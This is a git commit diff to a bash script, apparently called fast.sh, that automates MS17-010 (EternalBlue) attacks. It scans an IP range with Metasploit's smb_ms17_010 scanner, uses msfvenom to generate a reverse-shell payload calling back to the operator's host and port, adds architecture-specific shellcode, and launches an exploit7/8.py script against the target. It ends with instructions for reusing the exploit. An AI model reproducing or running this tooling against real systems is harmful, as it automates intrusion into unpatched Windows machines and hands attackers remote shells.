c6e781fe8b8ce0031f6a38014db22ebb5c3102cf
missyes <root@localhost.localdomain>
2018-10-30 22:50:48 -0400

    update

--- testing/fast.sh
+++ testing/fast.sh
@@ -14,6 +14,7 @@ file="dependencies/config.path"
 msfconsole=`sed -n 1p $file`
 msfvenom=`sed -n 2p $file`
 python=`sed -n 3p $file`
+rm -r scanner payload.bin payload.f.bin 
 clear
 echo -e $red""
 echo "=================================================================="
@@ -48,7 +49,8 @@ echo
 echo -e $yellow " Scanner by topranks  https://github.com/topranks/MS17-010_SUBNET"
 echo
 echo -e "  assembled by missyes"
-read 
+sleep 3
+clear
 echo -ne $okegreen " Scan network ? (Y/n)"
 read answer
 case $answer in 
@@ -67,24 +69,25 @@ read targetarch
 echo -ne $orange " Set an exploit to be used (exploit7(8).py) : "
 read exploitvers
 msfvenom -p tmp/$payload -f raw -o $pldname.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
-cat scripts/shellcode_$targetarch tmp/$pldname.bin > tmp/$pldname.f.bin
+cat scripts/shellcode_$targetarch $pldname.bin > $pldname.f.bin
 echo -e $red      " Is a listener ready ? "
 read 
-python scripts/$exploitvers $targetip tmp/$pldname.f.bin 12
+python scripts/$exploitvers $targetip $pldname.f.bin 12
 sleep 4
-rm -r tmp/*
 read 
 exit 0
 ;;
 *)
 echo -ne $okegreen "  Set a range of ip (example:192.168.0.100-110) : "
 read targetip
-echo "use auxiliary/scanner/smb/smb_ms17_010" > tmp/scanner
-echo "set RHOSTS $targetip" >> tmp/scanner
-echo "set THREADS 12" >> tmp/scanner
-echo "run" >> tmp/scanner
-gnome-terminal -e 'msfconsole -r tmp/scanner'
+echo "use auxiliary/scanner/smb/smb_ms17_010" > scanner
+echo "set RHOSTS $targetip" >> scanner
+echo "set THREADS 12" >> scanner
+echo "run" >> scanner
+gnome-terminal -e 'msfconsole -r scanner'
 sleep 2
+clear
+echo -e $okegreen " Push [ENTER] to continue"
 echo -e $red " PLEASE BE ATTENTIVELY IN CHOICE PAYLOAD (ex.:windows/x64/shell/reverse_tcp)"
 echo -ne $okegreen "  Set payload to use : "
 read payload
@@ -98,21 +101,20 @@ echo -ne $okegreen "  Set target architecture (x64/x86) : "
 read targetarch
 echo -ne $orange " Set an exploit to be used (exploit7(8).py) : "
 read exploitvers
-msfvenom -p tmp/$payload -f raw -o tmp/payload.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
+msfvenom -p $payload -f raw -o payload.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
 sleep 3
-cat scripts/shellcode_$targetarch tmp/payload.bin > tmp/payload.f.bin
-echo -e $red      " Is a listener ready ? "
+cat scripts/shellcode_$targetarch payload.bin > payload.f.bin
+echo -e $red     " Is a listener ready ? "
 read 
 sleep 1
-python scripts/$exploitvers $targetip tmp/payload.f.bin 12
+python scripts/$exploitvers $targetip payload.f.bin 12
 sleep 4
-rm -r tmp/*
 read
 ;;
 esac
+echo -e $orange" If you would like to use the same exploit again, run the following code in dirictory with payload.f.bin "
+echo -e $yellow " python exploit7(8).py target_ip payload.g.bin 12_or_17"
 exit 0
-
-
 
 
 
